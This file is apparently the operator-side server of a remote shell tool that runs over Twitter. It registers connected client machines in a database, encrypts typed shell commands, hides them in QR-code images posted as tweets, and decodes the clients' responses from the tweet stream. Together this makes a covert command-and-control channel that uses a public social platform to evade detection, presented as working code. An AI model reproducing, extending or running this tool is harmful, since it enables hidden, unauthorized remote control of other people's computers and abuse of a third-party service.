import time
import tweepy
import os
import zlib
import qrcode
from pyzbar.pyzbar import decode
from PIL import Image
import base64
from encryption import AESCipher, load_keys
import pickle
import json
import subprocess
import requests
from io import BytesIO
from api_keys import api_keys
import sys
from sqlalchemy import orm
from sqlalchemy.ext.declarative import declarative_base
import sqlalchemy as sa
import uuid
from colored import fg, attr

reset = attr('reset')
base = declarative_base()
engine = sa.create_engine('sqlite:///clients.db')
base.metadata.bind = engine
session = orm.scoped_session(orm.sessionmaker())(bind=engine)

# we using QRs cause twitter character limit banter

# models for clients
class Client(base):
    __tablename__ = 'clients' #<- must declare name for db table
    idx = sa.Column(sa.Integer,primary_key=True)
    client_id = sa.Column(sa.String(255),nullable=False)
    init_wrkdir = sa.Column(sa.String(512),nullable=False)
    
    def __repr__(self):
        return f"{self.client_id}"



# create listener
class ServerListener(tweepy.StreamListener):
    def __init__(self, api, cipher_key, session, current_client):
        self.api = api
        self.cipher = AESCipher(cipher_key)
        self.sess = session
        self.client_ids = [i.client_id for i in self.sess.query(Client).all()]
        self.server_id = uuid.uuid4().hex
        self.current_client = current_client
        self.command_to_send = ''
        assert self.server_id not in self.client_ids
        if not self.current_client:
            print(f"{fg('yellow')} No clients found, listening...")
        else: 
            print(fg('red'))
            print(f'Successfully connected to {self.current_client}!')
            self.command_to_send = input(self.sess.query(Client).filter(Client.client_id == self.current_client).all()[0].init_wrkdir)
            self.post_command(f'{self.current_client}::::{self.command_to_send}::::command')


    def on_data(self, raw_data):
        # process raw stream data, read qr, pipe message
        if 'delete' in raw_data:
            pass
        elif 'limit' in raw_data:
            pass
        else:
            self.process_raw(raw_data)
        return True

    def process_raw(self, raw_data):
        # do stuff here, raw_data is a string
        data = json.loads(raw_data)
        tweet = self.read_message(data)
        client_id = self._get_client_id(tweet)

        # is it a new connection?
        if self._tweet_type(tweet) == 'connection_confirm' and client_id not in self.client_ids and client_id!=self.server_id:
            # add new client
            self.sess.add(Client(client_id = client_id, init_wrkdir=self._get_response_message(tweet)))
            self.sess.commit()
            print(fg('green')+'New client connected!', client_id + fg('red'))
            connect_to_new = input(fg('yellow')+'Connect to new client? ' + client_id + '(Y/N)')
            if connect_to_new in ['y','Y']:
                print(fg('red'))
                self.current_client = client_id
                self.command_to_send = input(self._get_response_message(tweet))
                # send command and wait for response
                self.post_command(f'{self.current_client}::::{self.command_to_send}::::command')

        # is it a client response?
        if client_id == self.current_client and self._tweet_type(tweet) == 'command_response' and client_id!=self.server_id:
            # this is a response!
            print('this is a response!')
            response = self._get_response_message(tweet)
            print(response+ '\n')
            self.command_to_send = input(self._get_response_message(tweet))
            # send command and wait for response
            self.post_command(f'{self.current_client}::::{self.command_to_send}::::command')

    def on_error(self, status_code):
        if status_code == 420:
            return False
#-------------------------------------------------------Private subs-------------------------------------------------------#

    def _tweet_type(self, tweet):
        if tweet.split('::::'):
            return tweet.split('::::')[-1]
        return 'empty'
    
    def _get_client_id(self, tweet):
        if tweet.split('::::'):
            return tweet.split('::::')[0]
        return 'empty'
    
    def _get_response_message(self, tweet):
        if tweet.split('::::'):
            return tweet.split('::::')[1]
        return 'empty'
    
    def _connect_different(self):
        choice = input(reset + 'Would you like to connect to someone else or quit? (connect/quit)')
        if choice in ['connect', 'c', 'con']:
            possible_clients = session.query(Client).all()
            if possible_clients:
                print('Available clients: ', fg('yellow'))
                for client in possible_clients:
                    print(client)
                wanted_client = input('Please select a client to connect to: ')
                print(f'Connecting to {wanted_client}...')
                self.current_client = wanted_client
                self.command_to_send = input(self.sess.query(Client).filter(Client.client_id == self.current_client).all()[0].init_wrkdir)
                self.post_command(f'{self.current_client}::::{self.command_to_send}::::command')
            else:
                print(f"{fg('yellow')} No clients found, listening...")
        else:
            sys.exit(reset+"Goodbye!")
#-------------------------------------------------------Public subs-------------------------------------------------------#
    def generate_qr(self, message):
        # encode to base_64 and generate_qr
        message = self.cipher.encrypt(message)
        message = base64.b64encode(message.encode('utf-8'))
        qr = qrcode.make(message)
        return qr

    def read_qr(self, img):
        message = decode(img)[0].data.decode()
        message = base64.b64decode(message).decode('utf-8')
        return self.cipher.decrypt(message)

    def post_command(self, message):
        if self.command_to_send == 'exit ShAfT':
            self._connect_different()
        else:
            qr = self.generate_qr(message)
            qr.save('command_to_send.jpg')
            # post to twitter
            self.api.update_with_media('command_to_send.jpg')
            os.remove('command_to_send.jpg')
            return True

    def read_message(self, tweet_data):
        if 'media' in tweet_data['entities']:
            if 'media_url_https' in tweet_data['entities']['media'][0]:
                # get image
                response = requests.get(tweet_data['entities']['media'][0]['media_url_https'])
                img = Image.open(BytesIO(response.content))
                message = self.read_qr(img)
                return message
        else:
            return tweet_data['text']

# create stream
class ShellStream():
    def __init__(self, auth, listener):
        self.stream = tweepy.Stream(auth=auth, listener=listener)

    def start(self, user_id):
        self.stream.filter(follow = [user_id])



if __name__ == '__main__':
    _, aeskey = load_keys()
    base.metadata.create_all()
    possible_clients = session.query(Client).all()
    auth = tweepy.OAuthHandler(api_keys['consumer_key'], api_keys['consumer_secret'])
    auth.set_access_token(api_keys['access_token'], api_keys['access_token_secret'])
    api = tweepy.API(auth)

    if possible_clients:
        print('Available clients: ', fg('yellow'))
        for client in possible_clients:
            print(client)
        wanted_client = input('Please select a client to connect to: ')
        print(f'Connecting to {wanted_client}...')
        stream = ShellStream(auth = auth, listener=ServerListener(api, aeskey, session, wanted_client))
    else:
        stream = ShellStream(auth = auth, listener=ServerListener(api, aeskey, session, None))
    
    stream.start(api_keys['my_user_id'])
        
    



